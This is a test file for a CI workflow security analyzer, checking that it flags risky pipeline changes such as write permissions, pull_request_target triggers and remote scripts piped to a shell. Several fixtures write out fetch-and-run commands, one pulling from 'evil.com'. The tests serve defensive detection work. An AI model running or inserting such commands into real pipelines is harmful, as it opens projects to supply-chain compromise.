/**
 * CI workflow analyzer tests.
 */

import { describe, expect, it } from "bun:test";
import { analyzeCIWorkflows } from "../src/analyzers/ci-workflows.js";
import type { CIWorkflowFinding } from "../src/core/types.js";
import { createChangeSet, createFileDiff, createFileChange } from "./fixtures/index.js";

describe("analyzeCIWorkflows", () => {
  describe("file detection", () => {
    it("should detect .github/workflows/*.yml files", () => {
      const changeSet = createChangeSet({
        files: [createFileChange(".github/workflows/ci.yml", "added")],
        diffs: [
          createFileDiff(
            ".github/workflows/ci.yml",
            ["name: CI", "on: [push]"],
            [],
            "added"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.some((f) => f.type === "ci-workflow")).toBe(true);
    });

    it("should detect .github/workflows/*.yaml files", () => {
      const changeSet = createChangeSet({
        files: [createFileChange(".github/workflows/deploy.yaml", "added")],
        diffs: [
          createFileDiff(
            ".github/workflows/deploy.yaml",
            ["name: Deploy"],
            [],
            "added"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      expect(findings.some((f) => f.type === "ci-workflow")).toBe(true);
    });

    it("should detect .gitlab-ci.yml", () => {
      const changeSet = createChangeSet({
        files: [createFileChange(".gitlab-ci.yml", "added")],
        diffs: [
          createFileDiff(
            ".gitlab-ci.yml",
            ["stages:", "  - build", "  - test"],
            [],
            "added"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      expect(findings.some((f) => f.type === "ci-workflow")).toBe(true);
    });

    it("should detect Jenkinsfile", () => {
      const changeSet = createChangeSet({
        files: [createFileChange("Jenkinsfile", "added")],
        diffs: [
          createFileDiff(
            "Jenkinsfile",
            ["pipeline {", "  agent any", "}"],
            [],
            "added"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      expect(findings.some((f) => f.type === "ci-workflow")).toBe(true);
    });

    it("should detect azure-pipelines.yml", () => {
      const changeSet = createChangeSet({
        files: [createFileChange("azure-pipelines.yml", "added")],
        diffs: [
          createFileDiff(
            "azure-pipelines.yml",
            ["trigger:", "  - main"],
            [],
            "added"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      expect(findings.some((f) => f.type === "ci-workflow")).toBe(true);
    });
  });

  describe("permissions_broadened risk type", () => {
    it("should detect contents: write permission", () => {
      const changeSet = createChangeSet({
        files: [createFileChange(".github/workflows/ci.yml", "modified")],
        diffs: [
          createFileDiff(
            ".github/workflows/ci.yml",
            [
              "permissions:",
              "  contents: write",
            ],
            [],
            "modified"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      const permissionFinding = findings.find(
        (f) => (f as CIWorkflowFinding).riskType === "permissions_broadened"
      );
      expect(permissionFinding).toBeDefined();
    });

    it("should detect id-token: write permission", () => {
      const changeSet = createChangeSet({
        files: [createFileChange(".github/workflows/deploy.yml", "modified")],
        diffs: [
          createFileDiff(
            ".github/workflows/deploy.yml",
            [
              "permissions:",
              "  id-token: write",
            ],
            [],
            "modified"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      const permissionFinding = findings.find(
        (f) => (f as CIWorkflowFinding).riskType === "permissions_broadened"
      );
      expect(permissionFinding).toBeDefined();
    });

    it("should detect actions: write permission", () => {
      const changeSet = createChangeSet({
        files: [createFileChange(".github/workflows/ci.yml", "modified")],
        diffs: [
          createFileDiff(
            ".github/workflows/ci.yml",
            [
              "permissions:",
              "  actions: write",
            ],
            [],
            "modified"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      const permissionFinding = findings.find(
        (f) => (f as CIWorkflowFinding).riskType === "permissions_broadened"
      );
      expect(permissionFinding).toBeDefined();
    });
  });

  describe("pull_request_target risk type", () => {
    it("should detect pull_request_target trigger", () => {
      const changeSet = createChangeSet({
        files: [createFileChange(".github/workflows/pr.yml", "added")],
        diffs: [
          createFileDiff(
            ".github/workflows/pr.yml",
            [
              "name: PR Check",
              "on:",
              "  pull_request_target:",
              "    branches: [main]",
            ],
            [],
            "added"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      const prTargetFinding = findings.find(
        (f) => (f as CIWorkflowFinding).riskType === "pull_request_target"
      );
      expect(prTargetFinding).toBeDefined();
      expect((prTargetFinding as CIWorkflowFinding).details).toContain("secrets");
    });
  });

  describe("remote_script_download risk type", () => {
    it("should detect curl piped to sh", () => {
      const changeSet = createChangeSet({
        files: [createFileChange(".github/workflows/setup.yml", "added")],
        diffs: [
          createFileDiff(
            ".github/workflows/setup.yml",
            [
              "steps:",
              "  - run: curl https://example.com/install.sh | sh",
            ],
            [],
            "added"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      const scriptFinding = findings.find(
        (f) => (f as CIWorkflowFinding).riskType === "remote_script_download"
      );
      expect(scriptFinding).toBeDefined();
      expect((scriptFinding as CIWorkflowFinding).details).toContain("supply chain");
    });

    it("should detect wget piped to bash", () => {
      const changeSet = createChangeSet({
        files: [createFileChange(".github/workflows/setup.yml", "added")],
        diffs: [
          createFileDiff(
            ".github/workflows/setup.yml",
            [
              "steps:",
              "  - run: wget https://example.com/script | bash",
            ],
            [],
            "added"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      const scriptFinding = findings.find(
        (f) => (f as CIWorkflowFinding).riskType === "remote_script_download"
      );
      expect(scriptFinding).toBeDefined();
    });
  });

  describe("pipeline_changed risk type", () => {
    it("should detect general pipeline changes", () => {
      const changeSet = createChangeSet({
        files: [createFileChange(".github/workflows/ci.yml", "modified")],
        diffs: [
          createFileDiff(
            ".github/workflows/ci.yml",
            ["- run: npm test"],
            [],
            "modified"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      const pipelineFinding = findings.find(
        (f) => (f as CIWorkflowFinding).riskType === "pipeline_changed"
      );
      expect(pipelineFinding).toBeDefined();
      expect((pipelineFinding as CIWorkflowFinding).details).toContain("modified");
    });
  });

  describe("non-CI files", () => {
    it("should return empty for non-CI files", () => {
      const changeSet = createChangeSet({
        files: [createFileChange("src/index.ts", "modified")],
        diffs: [
          createFileDiff("src/index.ts", ["export const x = 1;"], [], "modified"),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      expect(findings).toHaveLength(0);
    });

    it("should not detect workflows in wrong location", () => {
      const changeSet = createChangeSet({
        files: [createFileChange("workflows/ci.yml", "added")],
        diffs: [
          createFileDiff("workflows/ci.yml", ["name: CI"], [], "added"),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      expect(findings).toHaveLength(0);
    });
  });

  describe("multiple findings per file", () => {
    it("should detect multiple risk types in same workflow", () => {
      const changeSet = createChangeSet({
        files: [createFileChange(".github/workflows/risky.yml", "added")],
        diffs: [
          createFileDiff(
            ".github/workflows/risky.yml",
            [
              "name: Risky Workflow",
              "on:",
              "  pull_request_target:",
              "    branches: [main]",
              "permissions:",
              "  contents: write",
              "jobs:",
              "  setup:",
              "    steps:",
              "      - run: curl https://evil.com/setup.sh | sh",
            ],
            [],
            "added"
          ),
        ],
      });

      const findings = analyzeCIWorkflows.analyze(changeSet);
      
      const riskTypes = findings.map((f) => (f as CIWorkflowFinding).riskType);
      expect(riskTypes).toContain("pull_request_target");
      expect(riskTypes).toContain("permissions_broadened");
      expect(riskTypes).toContain("remote_script_download");
      expect(riskTypes).toContain("pipeline_changed");
    });
  });
});
